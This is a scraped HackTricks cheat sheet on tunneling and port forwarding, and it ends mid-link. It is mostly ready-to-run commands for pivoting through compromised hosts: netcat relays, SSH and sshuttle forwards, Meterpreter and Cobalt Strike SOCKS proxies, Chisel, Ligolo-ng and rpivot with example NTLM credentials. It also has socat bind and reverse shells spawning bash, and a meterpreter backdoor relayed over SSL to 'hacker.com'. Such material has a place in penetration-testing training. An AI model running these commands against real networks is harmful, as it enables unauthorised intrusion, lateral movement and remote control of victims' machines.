0 24 24"%3E%3Cpath fill="currentColor" d="M12 17q.425 0 .713-.288T13 16q0-.425-.288-.712T12 15q-.425 0-.712.288T11 16q0 .425.288.713T12 17m0-4q.425 0 .713-.288T13 12V8q0-.425-.288-.712T12 7q-.425 0-.712.288T11 8v4q0 .425.288.713T12 13m-3.35 7H6q-.825 0-1.412-.587T4 18v-2.65L2.075 13.4q-.275-.3-.425-.662T1.5 12q0-.375.15-.737t.425-.663L4 8.65V6q0-.825.588-1.412T6 4h2.65l1.95-1.925q.3-.275.663-.425T12 1.5q.375 0 .738.15t.662.425L15.35 4H18q.825 0 1.413.588T20 6v2.65l1.925 1.95q.275.3.425.663t.15.737q0 .375-.15.738t-.425.662L20 15.35V18q0 .825-.587 1.413T18 20h-2.65l-1.95 1.925q-.3.275-.662.425T12 22.5q-.375 0-.737-.15t-.663-.425zm.85-2l2.5 2.5l2.5-2.5H18v-3.5l2.5-2.5L18 9.5V6h-3.5L12 3.5L9.5 6H6v3.5L3.5 12L6 14.5V18zm2.5-6"%2F%3E%3C%2Fsvg%3E'); } div.codeblock_filename_container + pre { margin-top: 0; } span.codeblock_filename_inner { border-radius: 0.4rem 0.4rem 0 0; padding: 0.6rem 1rem 0.6rem 1rem; font-family: var(--mono-font) !important; font-size: var(--code-font-size); } Tunneling and Port Forwarding Reading time: 18 minutes tip Learn & practice AWS Hacking:HackTricks Training AWS Red Team Expert (ARTE) Learn & practice GCP Hacking: HackTricks Training GCP Red Team Expert (GRTE) Support HackTricks Check the subscription plans! Join the 💬 Discord group or the telegram group or follow us on Twitter 🐦 @hacktricks_live. Share hacking tricks by submitting PRs to the HackTricks and HackTricks Cloud github repos. Nmap tip warning ICMP and SYN scans cannot be tunnelled through socks proxies, so we must disable ping discovery (-Pn) and specify TCP scans (-sT) for this to work. Bash Host -> Jump -> InternalA -> InternalB bash # On the jump server connect the port 3333 to the 5985 mknod backpipe p; nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe # On InternalA accessible from Jump and can access InternalB ## Expose port 3333 and connect it to the winrm port of InternalB exec 3<>/dev/tcp/internalB/5985 exec 4<>/dev/tcp/Jump/3333 cat <&3 >&4 & cat <&4 >&3 & # From the host, you can now access InternalB from the Jump server evil-winrm -u username -i Jump SSH SSH graphical connection (X) bash ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X Local Port2Port Open new Port in SSH Server --> Other port bash ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere bash ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere Port2Port Local port --> Compromised host (SSH) --> Third_box:Port bash ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f] #This way the terminal is still in your host #Example sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised> Port2hostnet (proxychains) Local Port --> Compromised host (SSH) --> Wherever bash ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy) Reverse Port Forwarding This is useful to get reverse shells from internal hosts through a DMZ to your host: bash ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000 # Note that port 443 must be open # Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems # and change the line "GatewayPorts no" to "GatewayPorts yes" # to be able to make ssh listen in non internal interfaces in the victim (443 in this case) VPN-Tunnel You need root in both devices (as you are going to create new interfaces) and the sshd config has to allow root login: PermitRootLogin yes PermitTunnel yes bash ssh root@server -w any:any #This will create Tun interfaces in both devices ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP ifconfig tun0 up #Activate the client side network interface ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP ifconfig tun0 up #Activate the server side network interface Enable forwarding on the Server side bash echo 1 > /proc/sys/net/ipv4/ip_forward iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE Set a new route on the client side route add -net 10.0.0.0/16 gw 1.1.1.1 SSHUTTLE You can tunnel via ssh all the traffic to a subnetwork through a host. For example, forwarding all the traffic going to 10.10.10.0/24 bash pip install sshuttle sshuttle -r user@host 10.10.10.10/24 Connect with a private key bash sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa' # -D : Daemon mode Meterpreter Port2Port Local port --> Compromised host (active session) --> Third_box:Port bash # Inside a meterpreter session portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host> SOCKS bash background# meterpreter session route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8) use auxiliary/server/socks_proxy run #Proxy port 1080 by default echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains Another way: bash background #meterpreter session use post/multi/manage/autoroute set SESSION <session_n> set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0 set NETMASK <Netmask> run use auxiliary/server/socks_proxy set VERSION 4a run #Proxy port 1080 by default echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains Cobalt Strike SOCKS proxy Open a port in the teamserver listening in all the interfaces that can be used to route the traffic through the beacon. bash beacon> socks 1080 [+] started SOCKS4a server on: 1080 # Set port 1080 as proxy server in proxychains.conf proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25 rPort2Port warning In this case, the port is opened in the beacon host, not in the Team Server and the traffic is sent to the Team Server and from there to the indicated host:port bash rportfwd [bind port] [forward host] [forward port] rportfwd stop [bind port] To note: Beacon's reverse port forward is designed to tunnel traffic to the Team Server, not for relaying between individual machines. Traffic is tunneled within Beacon's C2 traffic, including P2P links. Admin privileges are not required to create reverse port forwards on high ports. rPort2Port local warning In this case, the port is opened in the beacon host, not in the Team Server and the traffic is sent to the Cobalt Strike client (not to the Team Server) and from there to the indicated host:port rportfwd_local [bind port] [forward host] [forward port] rportfwd_local stop [bind port] reGeorg https://github.com/sensepost/reGeorg You need to upload a web file tunnel: ashx|aspx|js|jsp|php|php|jsp bash python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp Chisel You can download it from the releases page of https://github.com/jpillora/chisel You need to use the same version for client and server socks bash ./chisel server -p 8080 --reverse #Server -- Attacker ./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim #And now you can use proxychains with port 1080 (default) ./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed) ./chisel client -v 10.10.10.10:8080 socks #Attacker Port forwarding bash ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim Ligolo-ng https://github.com/nicocha30/ligolo-ng Use the same version for agent and proxy Tunneling bash # Start proxy server and automatically generate self-signed TLS certificates -- Attacker sudo ./proxy -selfcert # Create an interface named "ligolo" -- Attacker interface_create --name "ligolo" # Print the currently used certificate fingerprint -- Attacker certificate_fingerprint # Start the agent with certification validation -- Victim ./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint> # Select the agent -- Attacker session 1 # Start the tunnel on the proxy server -- Attacker tunnel_start --tun "ligolo" # Display the agent's network configuration -- Attacker ifconfig # Create a route to the agent's specified network -- Attacker interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent> # Display the tun interfaces -- Attacker interface_list Agent Binding and Listening bash # Establish a tunnel from the proxy server to the agent # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp # Display the currently running listeners on the agent -- Attacker listener_list Access Agent's Local Ports bash # Establish a tunnel from the proxy server to the agent # Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker interface_add_route --name "ligolo" --route 240.0.0.1/32 Rpivot https://github.com/klsecservices/rpivot Reverse tunnel. The tunnel is started from the victim. A socks4 proxy is created on 127.0.0.1:1080 bash attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080 bash victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 Pivot through NTLM proxy bash victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd bash victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45 Socat https://github.com/andrew-d/static-binaries Bind shell bash victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337 Reverse shell bash attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane Port2Port bash socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> & Port2Port through socks bash socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678 Meterpreter through SSL Socat bash #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333 bash victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5 #Execute the meterpreter You can bypass a non-authenticated proxy executing this line instead of the last one in the victim's console: bash OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5 https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-met'''
